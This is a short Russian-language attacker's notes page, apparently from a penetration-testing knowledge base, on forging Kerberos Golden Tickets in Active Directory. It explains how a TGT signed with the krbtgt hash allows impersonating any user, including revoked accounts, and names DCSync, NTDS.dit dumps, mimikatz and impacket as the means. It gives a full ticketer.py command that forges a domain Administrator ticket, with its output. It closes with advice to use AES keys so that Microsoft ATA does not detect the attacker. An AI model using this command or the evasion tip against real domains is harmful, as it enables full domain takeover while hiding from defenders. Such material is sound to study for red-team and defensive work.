# Golden Ticket

## About

Он получается на шагах 3-4 в общем протоколе (это TGT)

Golden Ticket — нами созданный TGT (возможно сделать, если мы получили ключ krbtgt аккаунта) — подписан и зашифрован по хешу аккаунта krbtgt, что делает его действительным TGT тикетом.

Поскольку проверка учетной записи пользователя  не производится контроллером домена (KDC service) до тех пор, пока TGT не будет "старше" чем 20 минут, мы можем использовать удаленные/отозванные учетные записи.

krbtgt хеш пользователя может быть использован для представления себя другим пользователем с любыми привилегиями, даже на машине, не входящей в домен.

Только изменение пароля не влияет на успешность этой атаки.&#x20;

## Tools

Получить TGT можно через DCSync или дамп NTDS.dit

## Create Golden Ticket (from key)

* mimikatz kerberos::golden
* impacket ticketer.py

Create Golden Ticket with ticketer.py

```
$ ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for contoso.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in Administrator.ccache
```

По возможности используем AES, чтобы не детектили нас через MS ATA.
